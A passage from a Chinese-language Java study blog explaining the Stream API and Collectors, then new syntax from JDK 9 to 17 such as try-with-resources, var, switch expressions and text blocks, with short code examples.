<li>终止操作(终端操作)<br>终止操作的方法返回值类型就不再是Stream了，因此一旦执行终止操作，就结束整个Stream操作了。一旦执行终止操作，就执行中间操作链，最终产生结果并结束Stream。</li>
</ol>
<p><strong>使用说明</strong></p>
<ol>
<li>Stream自己不会储存数据</li>
<li>Stream不会改变源对象，会返回一个持有结果的新Stream</li>
<li>Stream操作是延迟执行的，会等到需要结果时才执行，即一旦执行终止操作，就执行中间操作链并产生结果</li>
<li>Stream一旦执行终止操作，就不能再调用其他中间或终止操作</li>
</ol>
<h5 id="创建-Stream-的三种方法"><a href="#创建-Stream-的三种方法" class="headerlink" title="创建 Stream 的三种方法"></a>创建 Stream 的三种方法</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建 Stream方式一：通过集合</span></span><br><span class="line">List&lt;Employee&gt; list = EmployeeData.getEmployees();</span><br><span class="line"><span class="comment">// default Stream&lt;E&gt; stream() : 返回一个顺序流</span></span><br><span class="line">Stream&lt;Employee&gt; stream = list.stream();</span><br><span class="line"><span class="comment">// default Stream&lt;E&gt; parallelStream() : 返回一个并行流</span></span><br><span class="line">Stream&lt;Employee&gt; stream1 = list.parallelStream();</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建 Stream方式二：通过数组</span></span><br><span class="line">Integer[] arr = <span class="keyword">new</span> <span class="title class_">Integer</span>[]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line"><span class="comment">//调用Arrays类的static &lt;T&gt; Stream&lt;T&gt; stream(T[] array): 返回一个流</span></span><br><span class="line">Stream&lt;Integer&gt; stream2 = Arrays.stream(arr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建 Stream方式三：通过Stream的of()</span></span><br><span class="line">Stream&lt;String&gt; stream3 = Stream.of(<span class="string">&quot;aa&quot;</span>, <span class="string">&quot;vv&quot;</span>, <span class="string">&quot;cc&quot;</span>);</span><br></pre></td></tr></table></figure>


<h5 id="Stream中间操作"><a href="#Stream中间操作" class="headerlink" title="Stream中间操作"></a>Stream中间操作</h5><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240728173753.png" alt="常用操作"></p>
<p>示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//filter(Predicate p)——接收 Lambda ， 从流中排除某些元素。</span></span><br><span class="line"><span class="comment">//练习：查询员工表中薪资大于7000的员工信息</span></span><br><span class="line">List&lt;Employee&gt; list = EmployeeData.getEmployees();</span><br><span class="line">Stream&lt;Employee&gt; stream = list.stream();</span><br><span class="line">stream.filter(employee -&gt; employee.getSalary() &gt; <span class="number">7000</span>).forEach(System.out::println);</span><br><span class="line">System.out.println();</span><br><span class="line"><span class="comment">//limit(n)——截断流，使其元素不超过给定数量。</span></span><br><span class="line"><span class="comment">// 错误：stream.limit(2).forEach(System.out::println); 流已经执行终止操作</span></span><br><span class="line">list.stream().limit(<span class="number">3</span>).forEach(System.out::println);</span><br><span class="line">System.out.println();</span><br><span class="line"><span class="comment">//skip(n) —— 跳过元素，返回一个扔掉了前 n 个元素的流。若流中元素不足 n 个，则返回一个空流。与 limit(n) 互补</span></span><br><span class="line">list.stream().skip(<span class="number">2</span>).forEach(System.out::println);</span><br><span class="line">System.out.println();</span><br><span class="line"><span class="comment">//distinct()——筛选(去重)，通过流所生成元素的 hashCode() 和 equals() 去除重复元素</span></span><br><span class="line">list.stream().distinct().forEach(System.out::println);</span><br><span class="line"></span><br><span class="line"><span class="comment">//练习：获取员工姓名长度大于3的员工的姓名。   </span></span><br><span class="line">list.stream().map(Employee::getName).filter(name -&gt; name.length() &gt; <span class="number">3</span>).forEach(System.out::println);</span><br><span class="line"></span><br><span class="line"><span class="comment">//sorted(Comparator com)——定制排序</span></span><br><span class="line"><span class="comment">//Comparator的抽象方法compare</span></span><br><span class="line">List&lt;Employee&gt; list = EmployeeData.getEmployees();</span><br><span class="line">list.stream().sorted((e1,e2)-&gt;e1.getAge()-e2.getAge()).forEach(System.out::println);</span><br></pre></td></tr></table></figure>


<h5 id="Stream终止操作"><a href="#Stream终止操作" class="headerlink" title="Stream终止操作"></a>Stream终止操作</h5><ul>
<li>终端操作会从流的流水线生成结果。其结果可以是任何不是流的值，例如：List、Integer，甚至是 void 。</li>
<li>流进行了终止操作后，不能再次使用。</li>
</ul>
<p>下列方法未标明返回值时默认返回Optional类对象，可以进一步调用get()方法恢复到原类对象<br>1-匹配与查找</p>
<table>
<thead>
<tr>
<th><strong>方法</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>allMatch(Predicate  p)</strong></td>
<td>检查是否匹配所有元素 True or False</td>
</tr>
<tr>
<td><strong>anyMatch(Predicate  p)</strong></td>
<td>检查是否至少匹配一个元素 True or False</td>
</tr>
<tr>
<td><strong>noneMatch(Predicate</strong>  <strong>p)</strong></td>
<td>检查是否没有匹配所有元素  True or False</td>
</tr>
<tr>
<td><strong>findFirst()</strong></td>
<td>返回第一个元素</td>
</tr>
<tr>
<td><strong>findAny()</strong></td>
<td>返回当前流中的任意元素</td>
</tr>
<tr>
<td><strong>count()</strong></td>
<td>返回流中元素总数</td>
</tr>
<tr>
<td><strong>max(Comparator c)</strong></td>
<td>返回流中最大值</td>
</tr>
<tr>
<td><strong>min(Comparator c)</strong></td>
<td>返回流中最小值</td>
</tr>
<tr>
<td><strong>forEach(Consumer c)</strong></td>
<td>内部迭代(使用  Collection  接口需要用户去做迭代，称为外部迭代。<br>相反，Stream  API 使用内部迭代——它帮你把迭代做了)</td>
</tr>
</tbody></table>
<p>2-归约</p>
<table>
<thead>
<tr>
<th><strong>方法</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>reduce(T  identity, BinaryOperator b)</strong></td>
<td>可以将流中元素反复结合起来，得到一个值。返回  T</td>
</tr>
<tr>
<td><strong>reduce(BinaryOperator  b)</strong></td>
<td>可以将流中元素反复结合起来，得到一个值。返回 Optional<T></td>
</tr>
</tbody></table>
<p>备注：map 和 reduce 的连接通常称为 map-reduce 模式，因 Google 用它来进行网络搜索而出名。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(list.stream().map(Employee::getSalary).reduce(Double::sum));<span class="comment">//计算员工工资</span></span><br></pre></td></tr></table></figure>

<p>3-收集</p>
<table>
<thead>
<tr>
<th><strong>方   法</strong></th>
<th><strong>描   述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>collect(Collector  c)</strong></td>
<td>将流转换为其他形式。接收一个  Collector接口的实现，<br>用于给Stream中元素做汇总的方法</td>
</tr>
</tbody></table>
<p>Collector 接口中方法的实现决定了如何对流执行收集的操作(如收集到 List、Set、Map)。<br>另外， Collectors 实用类提供了很多静态方法，可以方便地创建常见收集器实例，具体方法与实例如下表：</p>
<table>
<thead>
<tr>
<th><strong>方法</strong></th>
<th><strong>返回类型</strong></th>
<th><strong>作用</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>toList</strong></td>
<td>Collector&lt;T, ?, List<T>&gt;</td>
<td>把流中元素收集到List</td>
</tr>
<tr>
<td><strong>toSet</strong></td>
<td>Collector&lt;T, ?, Set<T>&gt;</td>
<td>把流中元素收集到Set</td>
</tr>
<tr>
<td><strong>toCollection</strong></td>
<td>Collector&lt;T, ?, C&gt;</td>
<td>把流中元素收集到创建的集合</td>
</tr>
<tr>
<td><strong>counting</strong></td>
<td>Collector&lt;T, ?, Long&gt;</td>
<td>计算流中元素的个数</td>
</tr>
<tr>
<td><strong>summingInt</strong></td>
<td>Collector&lt;T, ?, Integer&gt;</td>
<td>对流中元素的整数属性求和</td>
</tr>
<tr>
<td><strong>averagingInt</strong></td>
<td>Collector&lt;T, ?, Double&gt;</td>
<td>计算流中元素Integer属性的平均值</td>
</tr>
<tr>
<td><strong>summarizingInt</strong></td>
<td>Collector&lt;T, ?, IntSummaryStatistics&gt;</td>
<td>收集流中Integer属性的统计值。如：平均值</td>
</tr>
<tr>
<td><strong>joining</strong></td>
<td>Collector&lt;CharSequence, ?, String&gt;</td>
<td>连接流中每个字符串</td>
</tr>
<tr>
<td><strong>maxBy</strong></td>
<td>Collector&lt;T, ?, Optional<T>&gt;</td>
<td>根据比较器选择最大值</td>
</tr>
<tr>
<td><strong>minBy</strong></td>
<td>Collector&lt;T, ?, Optional<T>&gt;</td>
<td>根据比较器选择最小值</td>
</tr>
<tr>
<td><strong>reducing</strong></td>
<td>Collector&lt;T, ?, Optional<T>&gt;</td>
<td>从一个作为累加器的初始值开始，利用BinaryOperator与流中元素逐个结合，从而归约成单个值</td>
</tr>
<tr>
<td><strong>collectingAndThen</strong></td>
<td>Collector&lt;T,A,RR&gt;</td>
<td>包裹另一个收集器，对其结果转换函数</td>
</tr>
<tr>
<td><strong>groupingBy</strong></td>
<td>Collector&lt;T, ?, Map&lt;K, List<T>&gt;&gt;</td>
<td>根据某属性值对流分组，属性为K，结果为V</td>
</tr>
<tr>
<td><strong>partitioningBy</strong></td>
<td>Collector&lt;T, ?, Map&lt;Boolean, List<T>&gt;&gt;</td>
<td>根据true或false进行分区</td>
</tr>
</tbody></table>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;Employee&gt; emps= list.stream().collect(Collectors.toList());</span><br><span class="line">Set&lt;Employee&gt; emps= list.stream().collect(Collectors.toSet());</span><br><span class="line">Collection&lt;Employee&gt; emps =list.stream().collect(Collectors.toCollection(ArrayList::<span class="keyword">new</span>));</span><br><span class="line"><span class="type">long</span> <span class="variable">count</span> <span class="operator">=</span> list.stream().collect(Collectors.counting());</span><br><span class="line"><span class="type">int</span> total=list.stream().collect(Collectors.summingInt(Employee::getSalary));</span><br><span class="line"><span class="type">double</span> <span class="variable">avg</span> <span class="operator">=</span> list.stream().collect(Collectors.averagingInt(Employee::getSalary));</span><br><span class="line"><span class="type">int</span> SummaryStatisticsiss= list.stream().collect(Collectors.summarizingInt(Employee::getSalary));</span><br><span class="line">String str= list.stream().map(Employee::getName).collect(Collectors.joining());</span><br><span class="line">Optional&lt;Emp&gt;max= list.stream().collect(Collectors.maxBy(comparingInt(Employee::getSalary)));</span><br><span class="line">Optional&lt;Emp&gt; min = list.stream().collect(Collectors.minBy(comparingInt(Employee::getSalary)));</span><br><span class="line"><span class="type">int</span> total=list.stream().collect(Collectors.reducing(<span class="number">0</span>, Employee::getSalar, Integer::sum));</span><br><span class="line"><span class="type">int</span> how= list.stream().collect(Collectors.collectingAndThen(Collectors.toList(), List::size));</span><br><span class="line">Map&lt;Emp.Status, List&lt;Emp&gt;&gt; map= list.stream().collect(Collectors.groupingBy(Employee::getStatus));</span><br><span class="line">Map&lt;Boolean,List&lt;Emp&gt;&gt; vd = list.stream().collect(Collectors.partitioningBy(Employee::getManage));</span><br></pre></td></tr></table></figure>


<h4 id="jdk9-17-语法新结构"><a href="#jdk9-17-语法新结构" class="headerlink" title="jdk9-17 语法新结构"></a>jdk9-17 语法新结构</h4><h5 id="JDK9：Java的REPL工具：-jShell命令"><a href="#JDK9：Java的REPL工具：-jShell命令" class="headerlink" title="JDK9：Java的REPL工具： jShell命令"></a>JDK9：Java的REPL工具： jShell命令</h5><p>Java 终于拥有了像Python 和 Scala 之类语言的REPL工具（交互式编程环境，read - evaluate - print - loop）：<code>jShell</code>。以交互式的方式对语句和表达式进行求值。<code>即写即得</code>、<code>快速运行</code>。<br>利用jShell在没有创建类的情况下，在命令行里直接声明变量，计算表达式，执行语句。无需跟人解释”public static void main(String[] args)”这句”废话”。</p>
<p>使用示例：<br>Powershell输入jshell，进入jshell，输入\help即可查看可执行操作</p>
<h5 id="jdk7-jdk9-异常处理"><a href="#jdk7-jdk9-异常处理" class="headerlink" title="jdk7 &amp; jdk9 异常处理"></a>jdk7 &amp; jdk9 异常处理</h5><p><strong>JDK7的新特性</strong></p>
<p>在try的后面可以增加一个()，在括号中可以声明流对象并初始化。try中的代码执行完毕，会自动把流对象释放，就不用写finally了。</p>
<p>举例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//举例1</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test02</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> (</span><br><span class="line">        <span class="comment">// 资源对象的声明和初始化</span></span><br><span class="line">        <span class="type">FileWriter</span> <span class="variable">fw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="string">&quot;d:/1.txt&quot;</span>);</span><br><span class="line">        <span class="type">BufferedWriter</span> <span class="variable">bw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(fw);</span><br><span class="line">    ) &#123;</span><br><span class="line">        bw.write(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>说明：<br>1、在try()中声明的资源，无论是否发生异常，无论是否处理异常，都会自动关闭资源对象，不用手动关闭了。<br>2、这些资源实现类必须实现AutoCloseable或Closeable接口，实现其中的close()方法。Closeable是AutoCloseable的子接口。Java7几乎把所有的“资源类”（包括文件IO的各种类、JDBC编程的Connection、Statement等接口…）都进行了改写，改写后资源类都实现了AutoCloseable或Closeable接口，并实现了close()方法。<br>3、写到try()中的资源类的变量默认是final声明的，不能修改。</p>
<p><strong>JDK9的新特性</strong>try-catch外定义流对象，()内只写名称</p>
<p>try的前面可以定义流对象，try后面的()中可以直接引用流对象的名称。在try代码执行完毕后，流对象也可以释放掉，也不用写finally了。</p>
<p>举例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test04</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">InputStreamReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(System.in);</span><br><span class="line">    <span class="type">OutputStreamWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OutputStreamWriter</span>(System.out);</span><br><span class="line">    <span class="keyword">try</span> (reader; writer) &#123;</span><br><span class="line">        <span class="comment">//reader是final的，不可再被赋值</span></span><br><span class="line">        <span class="comment">//   reader = null;</span></span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="jdk10-局部变量类型推断-var类型名"><a href="#jdk10-局部变量类型推断-var类型名" class="headerlink" title="jdk10 局部变量类型推断 var类型名"></a>jdk10 局部变量类型推断 var类型名</h5><p><strong>JDK 10的新特性</strong></p>
<p>局部变量的显示类型声明，常常被认为是不必须的，给一个好听的名字反而可以很清楚的表达出下面应该怎样继续。本新特性允许开发人员省略通常不必要的局部变量类型声明，以增强Java语言的体验性、可读性。</p>
<ul>
<li><p>使用举例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.局部变量的实例化</span></span><br><span class="line"><span class="type">var</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line"></span><br><span class="line"><span class="type">var</span> <span class="variable">set</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>&lt;Integer&gt;();</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.增强for循环中的索引</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> v : list) &#123;</span><br><span class="line">    System.out.println(v);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//3.传统for循环中</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">var</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">    System.out.println(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//4. 返回值类型含复杂泛型结构</span></span><br><span class="line"><span class="type">var</span> <span class="variable">iterator</span> <span class="operator">=</span> set.iterator();</span><br><span class="line"><span class="comment">//Iterator&lt;Map.Entry&lt;Integer, Student&gt;&gt; iterator = set.iterator();</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>不适用场景</p>
<ul>
<li>声明一个成员变量</li>
<li>声明一个数组变量，并为数组静态初始化（省略new的情况下）</li>
<li>方法的返回值类型</li>
<li>方法的参数类型</li>
<li>没有初始化的方法内的局部变量声明</li>
<li>作为catch块中异常类型</li>
<li>Lambda表达式中函数式接口的类型</li>
<li>方法引用中函数式接口的类型</li>
</ul>
</li>
</ul>
<p><strong>注意：</strong></p>
<ul>
<li>var不是一个关键字，而是一个类型名，将它作为变量的类型。不能使用var作为类名。</li>
<li>这不是JavaScript。var并不会改变 Java是一门静态类型语言的事实。编译器负责推断出类型，并把结果写入字节码文件，就好像是开发人员自己敲入类型一样。</li>
</ul>
<h5 id="jdk14-16-instanceof的模式匹配"><a href="#jdk14-16-instanceof的模式匹配" class="headerlink" title="jdk14(16) instanceof的模式匹配"></a>jdk14(16) instanceof的模式匹配</h5><p><strong>JDK14引入,JDK16正式可用特性：</strong></p>
<p>instanceof 模式匹配通过提供更为简便的语法，来提高生产力。有了该功能，可以<strong>减少Java程序中显式强制转换</strong>的数量，实现更精确、简洁的类型安全的代码。</p>
<p>Java 14之前旧写法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(obj <span class="keyword">instanceof</span> String)&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> (String)obj; <span class="comment">//需要强转</span></span><br><span class="line">    .. str.contains(..)..</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Java 14新特性写法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(obj <span class="keyword">instanceof</span> String str)&#123;</span><br><span class="line">    .. str.contains(..)..</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="jdk-12-13-14-17-switch表达式"><a href="#jdk-12-13-14-17-switch表达式" class="headerlink" title="jdk 12,13,14 17 switch表达式"></a>jdk 12,13,14 17 switch表达式</h5><p>传统switch声明语句的弊端：</p>
<ul>
<li>匹配是自上而下的，如果忘记写break，后面的case语句不论匹配与否都会执行； —&gt;case穿透</li>
<li>所有的case语句共用一个块范围，在不同的case语句定义的变量名不能重复；</li>
<li>不能在一个case里写多个执行结果一致的条件；</li>
<li>整个switch不能作为表达式返回值；</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//常见错误实现</span></span><br><span class="line"><span class="keyword">switch</span>(month)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>|<span class="number">4</span>|<span class="number">5</span>:<span class="comment">//3|4|5 用了位运算符，11 | 100 | 101结果是 111是7</span></span><br><span class="line">        System.out.println(<span class="string">&quot;春季&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>|<span class="number">7</span>|<span class="number">8</span>:<span class="comment">//6|7|8用了位运算符，110 | 111 | 1000结果是1111是15</span></span><br><span class="line">        System.out.println(<span class="string">&quot;夏季&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">9</span>|<span class="number">10</span>|<span class="number">11</span>:<span class="comment">//9|10|11用了位运算符，1001 | 1010 | 1011结果是1011是11</span></span><br><span class="line">        System.out.println(<span class="string">&quot;秋季&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">12</span>|<span class="number">1</span>|<span class="number">2</span>:<span class="comment">//12|1|2 用了位运算符，1100 | 1 | 10 结果是1111，是15</span></span><br><span class="line">        System.out.println(<span class="string">&quot;冬季&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        System.out.println(<span class="string">&quot;输入有误&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>JDK12中预览特性：</strong></p>
<p>传统switch-case的弊端：</p>
<ol>
<li>匹配自上而下，若忘记写break，则后续case语句无论是否匹配均会执行–&gt;case穿透</li>
<li>所有的case语句共用一个块范围，不同case语句中间不可以定义同名变量</li>
<li>不能在一个case语句里写多个执行结果一致的条件</li>
<li>整个switch不能作为表达式返回值</li>
</ol>
<p>Java 12将会对switch声明语句进行扩展</p>
<ul>
<li>使用<code>case L -&gt;</code>来替代以前的<code>break;</code>，省去了 break 语句，避免了因少写 break 而出错。</li>
<li>同时将多个 case 合并到一行，显得简洁、清晰，也更加优雅的表达逻辑分支。</li>
<li>为了保持兼容性，case 条件语句中依然可以使用字符<code> :</code> ，但是同一个 switch 结构里不能混用<code> -&gt;</code> 和<code> :</code> ，否则编译错误。</li>
<li>可以返回switch整体的结果，但只适用于只有返回语句的情况，如同一case条件下还需执行其他语句，必须使用yield关键字</li>
</ul>
<p>示例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">Fruit</span> <span class="variable">fruit</span> <span class="operator">=</span> Fruit.GRAPE;</span><br><span class="line">    <span class="type">int</span> <span class="variable">numberOfLetters</span> <span class="operator">=</span> <span class="keyword">switch</span>(fruit)&#123;</span><br><span class="line">        <span class="keyword">case</span> PEAR -&gt; <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">case</span> APPLE,MANGO,GRAPE -&gt; <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">case</span> ORANGE,PAPAYA -&gt; <span class="number">6</span>;</span><br><span class="line">        <span class="keyword">default</span> -&gt; <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;No Such Fruit:&quot;</span> + fruit);</span><br><span class="line">    &#125;;</span><br><span class="line">    System.out.println(numberOfLetters);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>JDK13进一步拓展yield</strong></p>
<p>关键字yield用于返回指定数据，结束switch结构，当switch表达式(有返回值)应该使用yield，不返回值使用break；其与return的区别在于return会直接退出当前方法，yield只会结束switch块</p>
<p>示例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">Fruit</span> <span class="variable">fruit</span> <span class="operator">=</span> Fruit.GRAPE;</span><br><span class="line">    <span class="type">int</span> <span class="variable">numberOfLetters</span> <span class="operator">=</span> <span class="keyword">switch</span>(fruit)&#123;</span><br><span class="line">        <span class="keyword">case</span> PEAR -&gt; &#123;<span class="keyword">yield</span> <span class="number">4</span>&#125;;</span><br><span class="line">        <span class="keyword">case</span> APPLE,MANGO,GRAPE -&gt; &#123;<span class="keyword">yield</span> <span class="number">5</span>&#125;;</span><br><span class="line">        <span class="keyword">case</span> ORANGE,PAPAYA -&gt; &#123;<span class="keyword">yield</span> <span class="number">6</span>&#125;;</span><br><span class="line">        <span class="keyword">default</span> -&gt; <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;No Such Fruit:&quot;</span> + fruit);</span><br><span class="line">    &#125;;</span><br><span class="line">    System.out.println(numberOfLetters);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>JDK14后上述两个特性正式可用</strong></p>
<p><strong>JDK17(预览) switch的模式匹配</strong></p>
<p>预览特性必须使用preview标注的jdk17<br>旧写法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> String <span class="title function_">formatter</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">formatted</span> <span class="operator">=</span> <span class="string">&quot;unknown&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (o <span class="keyword">instanceof</span> Integer i) &#123;</span><br><span class="line">        formatted = String.format(<span class="string">&quot;int %d&quot;</span>, i);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (o <span class="keyword">instanceof</span> Long l) &#123;</span><br><span class="line">        formatted = String.format(<span class="string">&quot;long %d&quot;</span>, l);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (o <span class="keyword">instanceof</span> Double d) &#123;</span><br><span class="line">        formatted = String.format(<span class="string">&quot;double %f&quot;</span>, d);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (o <span class="keyword">instanceof</span> String s) &#123;</span><br><span class="line">        formatted = String.format(<span class="string">&quot;String %s&quot;</span>, s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> formatted;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>模式匹配新写法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> String <span class="title function_">formatterPatternSwitch</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">switch</span> (o) &#123;</span><br><span class="line">        <span class="keyword">case</span> Integer i -&gt; String.format(<span class="string">&quot;int %d&quot;</span>, i);</span><br><span class="line">        <span class="keyword">case</span> Long l    -&gt; String.format(<span class="string">&quot;long %d&quot;</span>, l);</span><br><span class="line">        <span class="keyword">case</span> Double d  -&gt; String.format(<span class="string">&quot;double %f&quot;</span>, d);</span><br><span class="line">        <span class="keyword">case</span> String s  -&gt; String.format(<span class="string">&quot;String %s&quot;</span>, s);</span><br><span class="line">        <span class="keyword">default</span>        -&gt; o.toString();</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接在 switch 上支持 Object 类型，这就等于同时支持多种类型，使用模式匹配得到具体类型，大大简化了语法量，这个功能很实用。</p>
<h5 id="jdk13-14-15-文本块"><a href="#jdk13-14-15-文本块" class="headerlink" title="jdk13,14,15 文本块"></a>jdk13,14,15 文本块</h5><p>现实问题：<br>在Java中，通常需要使用String类型表达HTML，XML，SQL或JSON等格式的字符串，在进行字符串赋值时需要进行转义和连接操作，然后才能编译该代码，这种表达方式难以阅读并且难以维护。</p>
<p><strong>JDK13的新特性</strong><br>使用”””作为文本块的开始符和结束符，在其中就可以放置多行的字符串，不需要进行任何转义。因此，文本块将提高Java程序的可读性和可写性。</p>
<p>基本使用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">line1</span></span><br><span class="line"><span class="string">line2</span></span><br><span class="line"><span class="string">line3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">//相当于：</span></span><br><span class="line"><span class="string">&quot;line1\nline2\nline3\n&quot;</span></span><br><span class="line"><span class="comment">//或者一个连接的字符串：</span></span><br><span class="line"><span class="string">&quot;line1\n&quot;</span> +</span><br><span class="line"><span class="string">&quot;line2\n&quot;</span> +</span><br><span class="line"><span class="string">&quot;line3\n&quot;</span></span><br></pre></td></tr></table></figure>

<p>如果字符串末尾不需要行终止符，则结束分隔符可以放在最后一行内容上。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">line1</span></span><br><span class="line"><span class="string">line2</span></span><br><span class="line"><span class="string">line3&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">//相当于 </span></span><br><span class="line"><span class="string">&quot;line1\nline2\nline3&quot;</span></span><br></pre></td></tr></table></figure>

<p>文本块可以表示空字符串，但不建议这样做，因为它需要两行源代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">empty</span> <span class="operator">=</span> <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>示例：html的文本块表示</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello, 尚硅谷<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>将其复制到Java的字符串中，会展示成以下内容：</p>
